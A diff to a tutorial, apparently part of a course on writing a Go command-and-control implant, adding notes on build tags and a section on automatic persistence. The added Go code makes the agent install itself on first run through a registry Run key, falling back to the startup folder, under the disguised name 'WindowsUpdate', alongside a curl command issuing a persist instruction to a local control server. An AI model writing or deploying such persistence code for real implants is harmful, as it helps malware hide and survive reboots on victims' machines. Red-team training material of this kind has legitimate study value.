@@ -487,6 +487,16 @@ func registerCommands(agent *HTTPSAgent) {
 }
 ```
 
+### Why No Interface This Time?
+
+You might notice that unlike shellcode (which required an interface in `internals/shellcode/`), persist doesn't use an interface. Here's why:
+
+**Shellcode**: The doers live in a separate package (`internals/shellcode/`). When code in the `agent` package needs to call into a different package, an interface provides the contract.
+
+**Persist**: All files are in the **same** `agent` package - `persist.go`, `persist_windows.go`, and `persist_other.go`. Go's build tags work at compile time: when you build for Windows, only `persist_windows.go` is included. When you build for Mac/Linux, only `persist_other.go` is included. Since both define the same `doPersist()` function and only one is ever compiled, no interface is needed.
+
+**Rule of thumb**: Same package + build tags = no interface. Different packages = interface needed.
+
 ## Test
 
 This is the moment of truth! You'll need a Windows machine (or VM) for this test.
@@ -557,6 +567,59 @@ Your agent survived a reboot.
 ```bash
 curl -X POST http://localhost:8080/command -d '{"command": "persist", "data": {"method": "registry", "name": "WindowsUpdate", "remove": true}}'
 ```
+
+## Taking It Further: Automated Persistence
+
+In this lesson, we implemented persistence as a command - the operator explicitly tells the agent to persist. This is useful for learning and gives you manual control.
+
+In practice, you'd often want **automatic persistence** - the agent installs itself on first run without waiting for a command. Here's how you'd architect that:
+
+**1. Create an auto-persist function in the agent:**
+
+```go
+// autoPersist attempts to install persistence automatically on startup
+func autoPersist() error {
+    // Try registry first
+    result := doPersist(control.PersistArgsAgent{
+        Method: "registry",
+        Name:   "WindowsUpdate",
+        AgentPath: getExecutablePath(),
+    })
+    if result.Success {
+        return nil
+    }
+
+    // Fall back to startup folder
+    result = doPersist(control.PersistArgsAgent{
+        Method: "startup",
+        Name:   "WindowsUpdate",
+        AgentPath: getExecutablePath(),
+    })
+    if result.Success {
+        return nil
+    }
+
+    return errors.New("all persistence methods failed")
+}
+```
+
+**2. Call it from main before starting the run loop:**
+
+```go
+func main() {
+    // Attempt auto-persistence on first run
+    if err := autoPersist(); err != nil {
+        log.Printf("Warning: auto-persist failed: %v", err)
+        // Optionally notify server of failure
+    }
+
+    // Continue with normal agent operation
+    agent := NewHTTPSAgent(...)
+    RunLoop(ctx, agent, cfg)
+}
+```
+
+This gives you the best of both worlds: automatic persistence with fallback, while still keeping the manual command for testing and cleanup.
 
 ## Course Recap
 
